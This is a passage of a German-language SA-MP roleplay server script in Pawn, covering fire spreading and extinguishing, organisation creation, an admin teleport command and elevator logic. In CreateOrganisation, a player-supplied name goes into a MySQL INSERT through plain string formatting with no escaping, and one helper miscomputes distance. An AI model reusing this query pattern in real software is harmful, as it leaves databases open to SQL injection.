						Flame[value][Smoke][4] = CreateDynamicObject(18727,x,y-1,z,0.0,0.0,0.0,Flame[value][Flame_world]);
						SetTimerEx("DestroyTheSmokeFromFlame",time,0,"d",value);
//						SendClientMessageToAll(-1, "OnFireUpdate 13");
					}
					ExtTimer[playerid] = SetTimerEx("FireTimer",time,0,"dd",playerid,value);
//					SendClientMessageToAll(-1, "OnFireUpdate 14 - Public angefordert Warte auf Antwort");
				}
			}
			if(CanPlayerBurn(playerid) && IsAtFlame(playerid) && (GetPlayerSkin(playerid) != 277 && GetPlayerSkin(playerid) != 278 && GetPlayerSkin(playerid) != 279)) { SetPlayerBurn(playerid); }
			new Float:x,Float:y,Float:z;
			ForEachPlayer(i)
			{
				if(playerid != i && IsPlayerConnected(i) && !IsPlayerNPC(i))
				{
					if(CanPlayerBurn(i) && PlayerOnFire[playerid] && !PlayerOnFire[i] && (GetPlayerSkin(playerid) != 277 && GetPlayerSkin(playerid) != 278 && GetPlayerSkin(playerid) != 279))
					{
						GetPlayerPos(i,x,y,z);
						if(IsPlayerInRangeOfPoint(playerid,1,x,y,z))
						{
							SetPlayerBurn(i);
						}
					}
				}
			}
		}
 	}
	return 1;
}
stock KillFire(id)
{
 	DestroyDynamicObject(Flame[id][Flame_id]);
	Flame[id][Flame_Exists] = 0;
	Flame[id][Flame_x] = -1;
	Flame[id][Flame_y] = -1;
	Flame[id][Flame_z] = -1;
	Flame[id][Flame_world] = -1;
	DestroyTheSmokeFromFlame(id);
	ForEachPlayer(i)
	{
		if(IsPlayerConnected(i))
		{//SetPlayerACHealth
    	    if(PlayerInfo[i][sMember] == 15)
    	    {
				RemovePlayerMapIcon(i,id);
		    }
		}
	}
}

stock IsInWaterCar(playerid)
{
    if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 407 || GetVehicleModel(GetPlayerVehicleID(playerid)) == 601) { return 1; }
	return 0;
}

stock IsPlayerInWater(playerid)
{
	new Float:X,Float:Y,Float:Z,an = GetPlayerAnimationIndex(playerid);
	GetPlayerPos(playerid,X,Y,Z);
	if((1544 >= an >= 1538 || an == 1062 || an == 1250) && (Z <= 0 || (Z <= 41.0 && IsPlayerInZone(playerid,-1387,-473,2025,2824))) ||
	(1544 >= an >= 1538 || an == 1062 || an == 1250) && (Z <= 2 || (Z <= 39.0 && IsPlayerInZone(playerid,-1387,-473,2025,2824))))
	{
 		return 1;
 	}
 	return 0;
}

stock CanPlayerBurn(playerid,val = 0)
{
	if(CallRemoteFunction("CanBurn","d",playerid) >= 0 && !IsPlayerInWater(playerid) && ((!val && !PlayerOnFire[playerid]) || (val && PlayerOnFire[playerid]))) { return 1; }
	return 0;
}
stock Float:DistanceCameraTargetToLocation(Float:CamX,Float:CamY,Float:CamZ,Float:ObjX,Float:ObjY,Float:ObjZ,Float:FrX,Float:FrY,Float:FrZ)
{
	new Float:TGTDistance;
	TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));
	new Float:tmpX,Float:tmpY,Float:tmpZ;
	tmpX = FrX * TGTDistance + CamX;
	tmpY = FrY * TGTDistance + CamY;
	tmpZ = FrZ * TGTDistance + CamZ;
	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}
stock Aiming_at_Flame(playerid)
{
	new id = -1;
	new Float:dis = 99999.99;
	new Float:dis2;
	new Float:px,Float:py,Float:pz;

	new Float:cx,Float:cy,Float:cz,Float:fx,Float:fy,Float:fz;
	GetPlayerCameraPos(playerid,cx,cy,cz);
	GetPlayerCameraFrontVector(playerid,fx,fy,fz);
	ForEachPlayer(i)
	{
	    if(IsPlayerConnected(i) && PlayerOnFire[i] && (IsInWaterCar(playerid) || GetPlayerWeapon(playerid) == 42 || GetPlayerWeapon(playerid) == 41) && PlayerOnFire[i])
	    {
	        GetPlayerPos(i,px,py,pz);
	        dis2 = DistanceCameraTargetToLocation(cx,cy,cz,px,py,pz,fx,fy,fz);//IsPlayerInZone
	        if(dis2 < dis)
	        {
				dis = dis2;
	    		id = i;
			}
		}
	}
	if(id != -1) { return id-MAX_PLAYERS; }
	for(new i; i < MAX_FLAMES; i++)
	{
		if(Flame[i][Flame_Exists])
		{
		    if(IsInWaterCar(playerid) || GetPlayerWeapon(playerid) == 42 || GetPlayerWeapon(playerid) == 41)
		    {
				dis2 = DistanceCameraTargetToLocation(cx,cy,cz,Flame[i][Flame_x],Flame[i][Flame_y],Flame[i][Flame_z]+Z_DIFFERENCE,fx,fy,fz);
				if(IsPlayerInAnyVehicle(playerid) && dis2 < CAR_RADIUS && dis2 < dis && GetPlayerVirtualWorld(playerid) == Flame[i][Flame_world])
				{
				    dis = dis2;
				    id = i;
				}
				else if(!IsPlayerInAnyVehicle(playerid) && dis2 < ONFOOT_RADIUS && dis2 < dis && GetPlayerVirtualWorld(playerid) == Flame[i][Flame_world])
				{
				    dis = dis2;
				    id = i;
				}
			}
		}
	}
	if(id != -1)
	{
		if((IsPlayerInAnyVehicle(playerid) && !IsPlayerInRangeOfPoint(playerid,50,Flame[id][Flame_x],Flame[id][Flame_y],Flame[id][Flame_z])) || (!IsPlayerInAnyVehicle(playerid)  && !IsPlayerInRangeOfPoint(playerid,5,Flame[id][Flame_x],Flame[id][Flame_y],Flame[id][Flame_z])))
		{ id = -1; }
	}
	return id;
}

stock Pressing(playerid)
{
	new keys,updown,leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	return keys;
}

stock Float:GetDistanceBetweenPoints(Float:x1f,Float:y1f,Float:z1f,Float:x2f,Float:y2f,Float:z2f)
{
	return floatadd(floatadd(floatsqroot(floatpower(floatsub(x1f,x2f),2)),floatsqroot(floatpower(floatsub(y1f,y2f),2))),floatsqroot(floatpower(floatsub(z1f,z2f),2)));
}
stock Pissing_at_Flame(playerid)
{
	new id = -1;
	new Float:dis = 99999.99,Float:dis2;


	new Float:x,Float:y,Float:z,Float:x1g,Float:y1g,Float:z1g,Float:a;
	GetXYInFrontOfPlayerX(playerid,x,y,z,a,1);
	z -= Z_DIFFERENCE;
	if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_PISSING)
	{
		ForEachPlayer(i)
		{
		    if(IsPlayerConnected(i) && PlayerOnFire[i] && PlayerOnFire[i])
		    {
		        GetPlayerPos(i,x1g,y1g,z1g);
		        if(IsPlayerInRangeOfPoint(playerid,ONFOOT_RADIUS,x1g,y1g,z1g))
		        {
		    		id = i;
				}
			}
		}
		if(id != -1) { return id-MAX_PLAYERS; }
		for(new i; i < MAX_FLAMES; i++)
		{
			if(Flame[i][Flame_Exists])
			{
				if(!IsPlayerInAnyVehicle(playerid))
				{
				    dis2 = GetDistanceBetweenPoints(x,y,z,Flame[i][Flame_x],Flame[i][Flame_y],Flame[i][Flame_z]);
				    if(dis2 < PISSING_WAY && dis2 < dis)
					{
					    id = i;
					    dis = dis2;
					}
				}
			}
		}
	}
	return id;
}
stock GetFlameSlot()
{
	for(new i=0;i<MAX_FLAMES;i++)
	{
		if(!Flame[i][Flame_Exists]) { return i; }
	}
	return -1;
}



stock AddPlayer(playerid)
{
	if(ConnectedPlayers >= GetMaxPlayers())return 0;
	ConnectedPlayerList[ConnectedPlayers++] = playerid;
	return 1;
}

stock RemovePlayer(playerid)
{
	for(new i=0;i<ConnectedPlayers;i++)
	{
	 	if(ConnectedPlayerList[i] != playerid)continue;
		ConnectedPlayers--;
		ConnectedPlayerList[i] = ConnectedPlayerList[ConnectedPlayers];
		return 1;
	}
	return 0;
}
stock IsPlayerInZone(playerid,Float:zminX,Float:zminY,Float:zmaxX,Float:zmaxY)
{
	new Float:zoneX,Float:zoneY,Float:zoneZ;
	GetPlayerPos(playerid,zoneX,zoneY,zoneZ);
	if(zoneX >= zminX && zoneX <= zmaxX && zoneY >= zminY && zoneY <= zmaxY)
	{
		return 1;
	}
	return 0;
}
stock GetXYInFrontOfPlayerX(playerid,&Float:x,&Float:y,&Float:z,&Float:a,Float:distance)
{
	GetPlayerPos(playerid,x,y,z);
	if(IsPlayerInAnyVehicle(playerid)) GetVehicleZAngle(GetPlayerVehicleID(playerid),a);
	else GetPlayerFacingAngle(playerid,a);
	x += (distance * floatsin(-a,degrees));
	y += (distance * floatcos(-a,degrees));
	return 0;
}



stock GivePlayerMoneySave(playerid,money)
{
    PlayerInfo[playerid][pCash] += money;
    ResetPlayerMoney(playerid);
    GivePlayerMoney(playerid, PlayerInfo[playerid][pCash]);
    return 0;
}


stock GetPlayerMoneySave(playerid)
{
	return PlayerInfo[playerid][pCash];
}

stock FreeHouseCheck()
{
	for(new i=0; i<MAX_HOUSE; i++)// 995
	{
		if(HouseInfo[i][hCreated] == 0)
		{
			return i;
		}
	}
	return 1;
}
stock FreeTankeCheck()
{
	for(new i=0; i<MAX_FUELSTATION; i++)
	{
		if(TankeInfo[i][tCreated] == 0)
		{
			return i;
		}
	}
	return 1;
}
stock FreeBizzCheck()
{
	for(new i=0; i<MAX_BIZZ; i++)
	{
		if(BizzInfo[i][bCreated] == 0)
		{
			return i;
		}
	}
	return 1;
}
stock FreesBizzCheck()
{
	for(new i=0; i<MAX_SBIZZ; i++)
	{
		if(SBizzInfo[i][sbCreated] == 0)
		{
			return i;
		}
	}
	return 1;
}
stock FreeFrakCheck()
{
	for(new i=0; i<MAX_FRAKS; i++)
	{
		if(FrakInfo[i][fCreated] == 0)
		{
			return i;
		}
	}
	return 1;
}


stock DeathIcon(playerid,Float:x, Float:y, Float:z)
{
	if(DeathIconErstellt[playerid] == 0)
	{
		new stringz[128];
		DeathText[playerid] = Create3DTextLabel(stringz,0xFFFFFFAA, Float:x, Float:y, Float:z, 10.0, 0);
		TotenKopf[playerid] = CreatePickup(1254,0, Float:x, Float:y, Float:z,-1);
		DeathIconErstellt[playerid] = 1;
	}
	return 1;
}



stock RemoveIcon(playerid)
{
	if(DeathIconErstellt[playerid] == 1)
	{
	    Delete3DTextLabel(DeathText[playerid]);
		DestroyPickup(TotenKopf[playerid]);
		DeathIconErstellt[playerid] = 0;
	}
	return 1;
}


stock CreateOrganisation(organisation[],playerid)
{
			new query[256];

			format(query,sizeof(query),"Du hast die Organisation '%s' erfolgreich erstellt.",organisation);
			SendClientMessage(playerid,COLOR_LIGHTBLUE,query);
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"Organisations Befehle:");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/org' um den Organisationschat zu nutzen");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orginvite' um jemanden als Mitglied in die Organisation einzuladen");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orguninvite' um jemanden als Mitglied der Organisation auszuladen");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orgmember' um die eingeloggten Mitglieder anzuzeigen");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orgdelete' um die Organisation zu löschen");
		    SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orgsetmotto' um das Organisations Motto zu ändern");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orgname' um den Namen der Organisation zu ändern");
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"- '/orgsetleader' um jemanden in der Organisation als Leiter auszuladen / hinzuzufügen");
		//	if(GetPlayerMoneySave(playerid) < 500000) return SCM(playerid,-1,"Du besitzt nicht genügend Geld!");
			GivePlayerMoneySave(playerid, -350000);

		//	PlayerInfo[playerid][pOrgLeader] = org;
		//	PlayerInfo[playerid][pOrgMember] = org;
	//		OrgInfo[org][OrgCreatet] = 1;
		//	strmid(OrgInfo[org][OrgName],organisation,0,strlen(organisation),32);
		//	strmid(OrgInfo[org][OrgOwner],PlayerInfo[playerid][Name],0,strlen(PlayerInfo[playerid][Name]),24);
		//	strmid(OrgInfo[org][OrgMotto],"Keins",0,strlen("Keins"),128);





		//mysql_function_query( connectionmysqlcon, query[], bool:cache, callback[], format[], {Float,_}:... )



			format(query,sizeof(query),"INSERT INTO organisations (OrgCreatet,OrgName,OrgOwner,OrgMotto) VALUES ('%d','%s','%s','%s')",1,organisation,GetName(playerid),"Keins");
//		    mysql_function_query(mysqlcon,query,true,"OnORGCreated","is",playerid,organisation);
            mysql_pquery(mysqlcon, query, "OnORGCreated", "is",playerid,organisation);
			return 1;

}



forward OnORGCreated(playerid,orgnmame[]);
public OnORGCreated(playerid,orgnmame[])
{
	new id = cache_insert_id();
	PlayerInfo[playerid][pOrgMember] = id;
	PlayerInfo[playerid][pOrgLeader] = id;
	OrgInfo[id][OrgCreatet] = 1;

	//OrgInfo[id][dborgid] = id;
	strmid(OrgInfo[id][OrgOwner],PlayerInfo[playerid][Name],0,strlen(PlayerInfo[playerid][Name]),24);
    strmid(OrgInfo[id][OrgMotto],"Keins",0,strlen("Keins"),128);
    strmid(OrgInfo[id][OrgName], orgnmame, 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);
    return 1;
}

/*
forward OnORGFinished(playerid,orgname[]);
public OnORGFinished(playerid,orgname[])
{
    printf("OnORGFinished abgerufen");
	new rows, fields,id,val[128];
	cache_get_data(rows, fields);
	if(rows == 0) return SendClientMessage(playerid,-1,"Error 1: Impossible Invalid Row-Count, please report this Bug to the Server Admins"); //print
	else
	{
	//	cache_get_field_content(0,"id",id);
	//	cache_get_field_content(0,"id",id);
		cache_get_field_content(0,"id",val); id = strval(val);
	}
	mysql_insert_id();
	PlayerInfo[playerid][pOrgMember] = id;
	PlayerInfo[playerid][pOrgLeader] = id;
	OrgInfo[id][OrgCreatet] = 1;
	strmid(OrgInfo[id][OrgOwner],PlayerInfo[playerid][Name],0,strlen(PlayerInfo[playerid][Name]),24);
    strmid(OrgInfo[id][OrgMotto],"Keins",0,strlen("Keins"),128);
//	strmid(OrgInfo[id][OrgName],orgname,0,32);
    strmid(OrgInfo[id][OrgName], orgname, 0, MAX_PLAYER_NAME, MAX_PLAYER_NAME);
	return 1;

}
*/





stock SendOrganisationsMessage(org,color,const string[])
{
	if(org == 0)return 1;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
			if(PlayerInfo[i][pOrgMember] == org)
			{
				SendClientMessage(i,color,string);
			}
		}
	}
	return 1;
}
new baseurl[] = "http://gta-reallife.de/models";

//-------------------------------------------------
/*
public OnPlayerRequestDownload(playerid, type, crc)
{
	new fullurl[256+1];
	new dlfilename[64+1];
	new foundfilename=0;

	if(!IsPlayerConnected(playerid)) return 0;

	if(type == DOWNLOAD_REQUEST_TEXTURE_FILE) {
		foundfilename = FindTextureFileNameFromCRC(crc,dlfilename,64);
	}
	else if(type == DOWNLOAD_REQUEST_MODEL_FILE) {
	    foundfilename = FindModelFileNameFromCRC(crc,dlfilename,64);
	}

	if(foundfilename) {
	    format(fullurl,256,"%s/%s",baseurl,dlfilename);
	    RedirectDownload(playerid,fullurl);
	}

	return 0;
}
*/
ocmd:gotocoords(playerid,params[]){

	if(PlayerInfo[playerid][pAdmin] < 2001)return SendClientMessage(playerid,RED,"Nö");

	new Float:pos[3];
	if(sscanf(params,"fff",pos[0],pos[1],pos[2]))return SendClientMessage(playerid,COLOR_GRAD2,"Benutze: /gotocoords <x> <y> <z>");
	SetPlayerPos(playerid,pos[0],pos[1],pos[2]);

	return 1;
}

stock AElevator_Initialize()
{
	// Create the elevator and elevator door objects
	AObj_Elevator 			= CreateObject(18755, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGROUND_Z_COORD + AELEVATOR_OFFSET, 0.000000, 0.000000, 0.000000);
	AObj_ElevatorDoors[0] 	= CreateObject(18757, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGROUND_Z_COORD + AELEVATOR_OFFSET, 0.000000, 0.000000, 0.000000);
	AObj_ElevatorDoors[1] 	= CreateObject(18756, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGROUND_Z_COORD + AELEVATOR_OFFSET, 0.000000, 0.000000, 0.000000);

    // Create the 3D text label for inside the elevator
	ALabel_Elevator = Create3DTextLabel("{CCCCCC}Drücke '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' um den Aufzug zu Rufen", 0xCCCCCCAA, AX_ELEVATOR_POS - 1.7, AY_ELEVATOR_POS - 1.75, AGROUND_Z_COORD - 0.4, 4.0, 0, 1);

	// Create variables
	new string[128], Float:z;

	// Loop
	for (new i; i < sizeof(AObj_FloorDoors); i ++)
	{
	    // Create elevator floor door objects
	    AObj_FloorDoors[i][0] 	= CreateObject(18757, AX_ELEVATOR_POS - 0.245, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(i), 0.000000, 0.000000, 0.000000);
		AObj_FloorDoors[i][1] 	= CreateObject(18756, AX_ELEVATOR_POS - 0.245, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(i), 0.000000, 0.000000, 0.000000);

		// Format string for the floor 3D text label
		format(string, sizeof(string), "{CCCCCC}[%s]\n{CCCCCC}Drücke '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' um den Aufzug zu Rufen", AFloorNames[i]);

		// Get label Z position
		z = AGetDoorsZCoordForFloor(i);

		// Create floor label
		ALabel_Floors[i] = Create3DTextLabel(string, 0xCCCCCCAA, AX_ELEVATOR_POS - 2.5, AY_ELEVATOR_POS - 2.5, z - 0.2, 10.5, 0, 1);
	}

	// Open the car park floor doors and the elevator doors
	AFloor_OpenDoors(0);
	AElevator_OpenDoors();

    // Exit here
	return 1;
}

stock AElevator_Destroy()
{
	// Destroys the elevator.

	DestroyObject(AObj_Elevator);
	DestroyObject(AObj_ElevatorDoors[0]);
	DestroyObject(AObj_ElevatorDoors[1]);
	Delete3DTextLabel(ALabel_Elevator);

	for(new i; i < sizeof(AObj_FloorDoors); i ++)
	{
	    DestroyObject(AObj_FloorDoors[i][0]);
		DestroyObject(AObj_FloorDoors[i][1]);
		Delete3DTextLabel(ALabel_Floors[i]);
	}

	return 1;
}

stock AElevator_OpenDoors()
{
	// Opens the elevator's doors.

	new Float:x, Float:y, Float:z;

	GetObjectPos(AObj_ElevatorDoors[0], x, y, z);
	MoveObject(AObj_ElevatorDoors[0], x, Y_DOOR_L_OPENED, z, DOORS_SPEED);
	MoveObject(AObj_ElevatorDoors[1], x, Y_DOOR_R_OPENED, z, DOORS_SPEED);

	return 1;
}

stock AElevator_CloseDoors()
{
    // Closes the elevator's doors.

    if(AElevatorState == ELEVATOR_STATE_MOVING)
	    return 0;

    new Float:x, Float:y, Float:z;

	GetObjectPos(AObj_ElevatorDoors[0], x, y, z);
	MoveObject(AObj_ElevatorDoors[0], x, Y_DOOR_CLOSED, z, DOORS_SPEED);
	MoveObject(AObj_ElevatorDoors[1], x, Y_DOOR_CLOSED, z, DOORS_SPEED);

	return 1;
}

stock AFloor_OpenDoors(floorid)
{
    // Opens the doors at the specified floor.

    MoveObject(AObj_FloorDoors[floorid][0], AX_ELEVATOR_POS - 0.245, Y_DOOR_L_OPENED, AGetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(AObj_FloorDoors[floorid][1], AX_ELEVATOR_POS - 0.245, Y_DOOR_R_OPENED, AGetDoorsZCoordForFloor(floorid), DOORS_SPEED);

//	PlaySoundForPlayersInRange(6401, 50.0, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid) + 5.0);

	return 1;
}

stock AFloor_CloseDoors(floorid)
{
    // Closes the doors at the specified floor.

    MoveObject(AObj_FloorDoors[floorid][0], AX_ELEVATOR_POS - 0.245, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), DOORS_SPEED);
	MoveObject(AObj_FloorDoors[floorid][1], AX_ELEVATOR_POS - 0.245, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), DOORS_SPEED);

//	PlaySoundForPlayersInRange(6401, 50.0, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid) + 5.0);

	return 1;
}

stock AElevator_MoveToFloor(floorid)
{
	// Moves the elevator to specified floor (doors are meant to be already closed).

	AElevatorState = ELEVATOR_STATE_MOVING;
	AElevatorFloor = floorid;

	// Move the elevator slowly, to give time to clients to sync the object surfing. Then, boost it up:
	MoveObject(AObj_Elevator, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetElevatorZCoordForFloor(floorid), 0.25);
    MoveObject(AObj_ElevatorDoors[0], AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), 0.25);
    MoveObject(AObj_ElevatorDoors[1], AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), 0.25);
    Delete3DTextLabel(ALabel_Elevator);

	AElevatorBoostTimer = SetTimerEx("AElevator_Boost", 2000, 0, "i", floorid);

	return 1;
}

public AElevator_Boost(floorid)
{
	// Increases the elevator's speed until it reaches 'floorid'
	StopObject(AObj_Elevator);
	StopObject(AObj_ElevatorDoors[0]);
	StopObject(AObj_ElevatorDoors[1]);

	MoveObject(AObj_Elevator, AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetElevatorZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(AObj_ElevatorDoors[0], AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);
    MoveObject(AObj_ElevatorDoors[1], AX_ELEVATOR_POS, AY_ELEVATOR_POS, AGetDoorsZCoordForFloor(floorid), ELEVATOR_SPEED);

	return 1;
}

public AElevator_TurnToIdle()
{
	AElevatorState = ELEVATOR_STATE_IDLE;
	AReadNextFloorInQueue();

	return 1;
}

stock ARemoveFirstQueueFloor()
{
	// Removes the data in AElevatorQueue[0], and reorders the queue accordingly.

	for(new i; i < sizeof(AElevatorQueue) - 1; i ++)
	    AElevatorQueue[i] = AElevatorQueue[i + 1];

	AElevatorQueue[sizeof(AElevatorQueue) - 1] = INVALID_FLOOR;

	return 1;
}

stock AAddFloorToQueue(floorid)
{
 	// Adds 'floorid' at the end of the queue.

	// Scan for the first empty space:
	new slot = -1;
	for(new i; i < sizeof(AElevatorQueue); i ++)
	{
	    if(AElevatorQueue[i] == INVALID_FLOOR)
	    {
	        slot = i;
	        break;
	    }
	}

	if(slot != -1)
	{
	    AElevatorQueue[slot] = floorid;

     	// If needed, move the elevator.
	    if(AElevatorState == ELEVATOR_STATE_IDLE)
	        AReadNextFloorInQueue();

	    return 1;
	}

	return 0;
}

stock AResetAElevatorQueue()
{
	// Resets the queue.

	for(new i; i < sizeof(AElevatorQueue); i ++)
	{
	    AElevatorQueue[i] 	= INVALID_FLOOR;
	    AFloorRequestedBy[i] = INVALID_PLAYER_ID;
	}

	return 1;
}

stock AIsFloorInQueue(floorid)
{
	// Checks if the specified floor is currently part of the queue.

	for(new i; i < sizeof(AElevatorQueue); i ++)
	    if(AElevatorQueue[i] == floorid)
	        return 1;

	return 0;
}

stock AReadNextFloorInQueue()
{
	// Reads the next floor in the queue, closes doors, and goes to it.

	if(AElevatorState != ELEVATOR_STATE_IDLE || AElevatorQueue[0] == INVALID_FLOOR)
	    return 0;

	AElevator_CloseDoors();
	AFloor_CloseDoors(AElevatorFloor);

	return 1;
}

stock ADidPlayerRequestElevator(playerid)
{
	for(new i; i < sizeof(AFloorRequestedBy); i ++)
	    if(AFloorRequestedBy[i] == playerid)
	        return 1;

	return 0;
}

stock AShowElevatorDialog(playerid)
{
	new string[512];
	for(new i; i < sizeof(AElevatorQueue); i ++)
	{
	    if(AFloorRequestedBy[i] != INVALID_PLAYER_ID)
	        strcat(string, "{FF0000}");

	    strcat(string, AFloorNames[i]);
	    strcat(string, "\n");
	}

	ShowPlayerDialog(playerid, ADIALOG_ID, DIALOG_STYLE_LIST, "LS Apartments 1 Aufzug", string, "Auswählen", "Abbrechen");

	return 1;
}

stock ACallElevator(playerid, floorid)
{
	// Calls the elevator (also used with the elevator dialog).

	if(AFloorRequestedBy[floorid] != INVALID_PLAYER_ID || AIsFloorInQueue(floorid))
	    return 0;

	AFloorRequestedBy[floorid] = playerid;
	AAddFloorToQueue(floorid);

	return 1;
}

stock Float:AGetElevatorZCoordForFloor(floorid)
{
    // Return Z height value plus a small offset
    return (AGROUND_Z_COORD + AFloorZOffsets[floorid] + AELEVATOR_OFFSET);
}

stock Float:AGetDoorsZCoordForFloor(floorid)
{
	// Return Z height value plus a small offset
	return (AGROUND_Z_COORD + AFloorZOffsets[floorid] + AELEVATOR_OFFSET);
}
stock BElevator_Initialize()
{
	// Create the elevator and elevator door objects
	BObj_Elevator 			= CreateObject(18755, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGROUND_Z_COORD, 0.000000, 0.000000, 80.000000);
	BObj_ElevatorDoors[0] 	= CreateObject(18757, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGROUND_Z_COORD, 0.000000, 0.000000, 80.000000);
	BObj_ElevatorDoors[1] 	= CreateObject(18756, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGROUND_Z_COORD, 0.000000, 0.000000, 80.000000);

	// Create the 3D text label for inside the elevator
	BLabel_Elevator = Create3DTextLabel("{CCCCCC}Press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' to use elevator", 0xCCCCCCAA, BX_ELEVATOR_POS + 1.6, BY_ELEVATOR_POS - 1.85, BGROUND_Z_COORD - 0.4, 4.0, 0, 1);

	// Create variables
	new string[128], Float:z;

	// Loop
	for (new i; i < sizeof(BObj_FloorDoors); i ++)
	{
	    // Create elevator floor door objects
	    BObj_FloorDoors[i][0] 	= CreateObject(18757, BX_ELEVATOR_POS, BY_ELEVATOR_POS - 0.245, BGetDoorsZCoordForFloor(i) + 0.05, 0.000000, 0.000000, 80.000000);
		BObj_FloorDoors[i][1] 	= CreateObject(18756, BX_ELEVATOR_POS, BY_ELEVATOR_POS - 0.245, BGetDoorsZCoordForFloor(i) + 0.05, 0.000000, 0.000000, 80.000000);

        // Format string for the floor 3D text label
		format(string, sizeof(string), "{CCCCCC}[%s]\n{CCCCCC}Press '{FFFFFF}~k~~CONVERSATION_YES~{CCCCCC}' to call", BFloorNames[i]);

		// Get label Z position
		z = BGetDoorsZCoordForFloor(i);

		// Create floor label
		BLabel_Floors[i] = Create3DTextLabel(string, 0xCCCCCCAA, BX_ELEVATOR_POS + 2, BY_ELEVATOR_POS -3, z - 0.2, 10.5, 0, 1);
	}

	// Open the car park floor doors and the elevator doors
	BFloor_OpenDoors(0);
	BElevator_OpenDoors();

	// Exit here
	return 1;
}

stock BElevator_Destroy()
{
	// Destroys the elevator.

	DestroyObject(BObj_Elevator);
	DestroyObject(BObj_ElevatorDoors[0]);
	DestroyObject(BObj_ElevatorDoors[1]);
	Delete3DTextLabel(BLabel_Elevator);

	for(new i; i < sizeof(BObj_FloorDoors); i ++)
	{
	    DestroyObject(BObj_FloorDoors[i][0]);
		DestroyObject(BObj_FloorDoors[i][1]);
		Delete3DTextLabel(BLabel_Floors[i]);
	}

	return 1;
}

stock BElevator_OpenDoors()
{
	// Opens the elevator's doors.

	new Float:x, Float:y, Float:z;

	GetObjectPos(BObj_ElevatorDoors[0], x, y, z);
	MoveObject(BObj_ElevatorDoors[0], BX_DOOR_L_OPENED, BY_DOOR_L_OPENED, z, DOORS_SPEED);
	MoveObject(BObj_ElevatorDoors[1], BX_DOOR_R_OPENED, BY_DOOR_R_OPENED, z, DOORS_SPEED);

	return 1;
}

stock BElevator_CloseDoors()
{
    // Closes the elevator's doors.

    if(BElevatorState == ELEVATOR_STATE_MOVING)
	    return 0;

    new Float:x, Float:y, Float:z;

	GetObjectPos(BObj_ElevatorDoors[0], x, y, z);
	MoveObject(BObj_ElevatorDoors[0], BX_ELEVATOR_POS, BY_ELEVATOR_POS, z, DOORS_SPEED);
	MoveObject(BObj_ElevatorDoors[1], BX_ELEVATOR_POS, BY_ELEVATOR_POS, z, DOORS_SPEED);

	return 1;
}

stock BFloor_OpenDoors(floorid)
{
    // Opens the doors at the specified floor.

    MoveObject(BObj_FloorDoors[floorid][0], BX_FDOOR_L_OPENED, BY_FDOOR_L_OPENED, BGetDoorsZCoordForFloor(floorid) + 0.05, DOORS_SPEED);
	MoveObject(BObj_FloorDoors[floorid][1], BX_FDOOR_R_OPENED, BY_FDOOR_R_OPENED, BGetDoorsZCoordForFloor(floorid) + 0.05, DOORS_SPEED);

//	PlaySoundForPlayersInRange(6401, 50.0, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid) + 5.0);

	return 1;
}

stock BFloor_CloseDoors(floorid)
{
    // Closes the doors at the specified floor.

    MoveObject(BObj_FloorDoors[floorid][0], BX_ELEVATOR_POS, BY_ELEVATOR_POS - 0.245, BGetDoorsZCoordForFloor(floorid) + 0.05, DOORS_SPEED);
	MoveObject(BObj_FloorDoors[floorid][1], BX_ELEVATOR_POS, BY_ELEVATOR_POS - 0.245, BGetDoorsZCoordForFloor(floorid) + 0.05, DOORS_SPEED);

//	PlaySoundForPlayersInRange(6401, 50.0, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetDoorsZCoordForFloor(floorid) + 5.0);

	return 1;
}

stock BElevator_MoveToFloor(floorid)
{
	// Moves the elevator to specified floor (doors are meant to be already closed).

	BElevatorState = ELEVATOR_STATE_MOVING;
	BElevatorFloor = floorid;

	// Move the elevator slowly, to give time to clients to sync the object surfing. Then, boost it up:
	MoveObject(BObj_Elevator, BX_ELEVATOR_POS, BY_ELEVATOR_POS, BGetElevatorZCoordForFloor(floorid), 0.25);
